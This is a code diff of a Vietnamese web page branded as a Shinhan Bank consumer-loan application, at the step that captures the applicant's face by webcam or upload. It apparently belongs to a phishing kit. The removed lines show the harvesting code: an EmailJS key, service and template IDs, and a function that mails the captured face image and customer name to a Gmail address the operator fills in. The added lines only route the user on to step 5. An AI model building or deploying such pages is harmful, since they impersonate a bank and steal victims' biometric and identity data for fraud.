@@ -334,7 +334,7 @@
 
             <div class="button-group">
                 <a href="/vaytieudung/shinhanbank/pages/vi/step3.html" class="btn btn-primary">QUAY LẠI</a>
-                <button id="proceedToStep6Btn" class="btn btn-primary" disabled>BƯỚC KẾ TIẾP</button>
+                <button id="proceedToStep5Btn" class="btn btn-primary" disabled>BƯỚC KẾ TIẾP</button>
             </div>
         </div>
 
@@ -355,48 +355,9 @@
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/dompurify@2.4.0/dist/purify.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
-    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@3.18.0/dist/tf.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/face-detection@1.0.0/dist/face-detection.min.js"></script>
     <script>
-        (function() {
-            emailjs.init("OrBsI926QI2_xBh1f");
-        })();
-
-        let userData = {
-            fullName: "Nguyễn Văn A",
-            loanAmount: 100000000,
-            loanCode: "SHB123456",
-            registrationDate: "08/05/2025",
-            email: "nguyenvana@example.com",
-            currentStep: 4,
-            faceVerified: false,
-            faceImage: ""
-        };
-
-        function loadUserData() {
-            try {
-                const storedData = localStorage.getItem('userData');
-                if (storedData) {
-                    userData = JSON.parse(CryptoJS.AES.decrypt(storedData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8));
-                    console.log('Loaded userData:', userData);
-                }
-            } catch (error) {
-                console.error('Error parsing userData:', error);
-            }
-        }
-
-        function saveToLocalStorage() {
-            try {
-                const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(userData), 'shinhan-secret-key').toString();
-                localStorage.setItem('userData', encryptedData);
-                console.log('Saved userData:', userData);
-            } catch (error) {
-                console.error('Error saving userData:', error);
-            }
-        }
-
         let videoStream = null;
         let faceDetected = false;
         let faceDetector = null;
@@ -454,11 +415,8 @@
 
                     if (faceDetectionCount >= 10) {
                         feedback.textContent = 'Khuôn mặt được xác minh!';
-                        userData.faceImage = canvas.toDataURL('image/png');
                         stopVideoStream();
                         faceDetected = true;
-                        userData.faceVerified = true;
-                        saveToLocalStorage();
                         updateButtonState();
                         return;
                     }
@@ -508,12 +466,9 @@
                 }
                 const reader = new FileReader();
                 reader.onload = function(e) {
-                    userData.faceImage = e.target.result;
                     $('#faceImageInfo').text(DOMPurify.sanitize(`${file.name} (${Math.round(file.size / 1024)} KB)`));
                     $('#faceFeedback').text('Khuôn mặt được xác minh!');
                     faceDetected = true;
-                    userData.faceVerified = true;
-                    saveToLocalStorage();
                     updateButtonState();
                 };
                 reader.readAsDataURL(file);
@@ -521,53 +476,18 @@
                 $('#faceImageInfo').text('');
                 $('#faceFeedback').text('Đang chờ khuôn mặt...');
                 faceDetected = false;
-                userData.faceVerified = false;
-                saveToLocalStorage();
                 updateButtonState();
             }
         });
 
         function updateButtonState() {
             const hasFaceImage = $('#faceImage').prop('files').length > 0;
-            $('#proceedToStep6Btn').prop('disabled', !faceDetected && !hasFaceImage);
+            $('#proceedToStep5Btn').prop('disabled', !faceDetected && !hasFaceImage);
         }
 
-        function sendFaceVerificationEmail() {
-            let params = {
-                to_email: "your-email@gmail.com", // Thay bằng email Gmail của bạn
-                from_name: "Shinhan Bank System",
-                customer_name: userData.fullName || 'Khách hàng',
-                time: new Date().toLocaleString('vi-VN'),
-                face_verified: userData.faceVerified ? "Đã xác minh" : "Chưa xác minh",
-                face_image: userData.faceImage || 'N/A'
-            };
-
-            emailjs.send('service_60tgxof', 'template_uhyb8ve', params)
-                .then(() => {
-                    console.log('Email sent successfully');
-                    alert("Thông tin xác minh khuôn mặt đã được gửi!");
-                    $('#faceImage').val('');
-                    $('#faceImageInfo').text('');
-                    $('#faceFeedback').text('Đang chờ khuôn mặt...');
-                    $('#faceProgressFill').css('width', '0%');
-                    stopVideoStream();
-                    const canvas = document.getElementById('faceScanCanvas');
-                    const ctx = canvas.getContext('2d');
-                    ctx.clearRect(0, 0, canvas.width, canvas.height);
-                    faceDetected = false;
-                    userData.currentStep = 6;
-                    saveToLocalStorage();
-                    window.location.href = '/vaytieudung/shinhanbank/pages/vi/step6.html';
-                })
-                .catch(error => {
-                    console.error('EmailJS error:', error);
-                    alert("Lỗi gửi thông tin. Vui lòng thử lại sau.");
-                });
-        }
-
-        $('#proceedToStep6Btn').on('click', function(e) {
+        $('#proceedToStep5Btn').on('click', function(e) {
             e.preventDefault();
-            sendFaceVerificationEmail();
+            window.location.href = 'step5.html';
         });
 
         $('.btn-primary, .capture-btn').on('keypress', function(e) {
@@ -577,7 +497,6 @@
         });
 
         window.onload = async function() {
-            loadUserData();
             await loadFaceDetector();
             updateButtonState();
         };
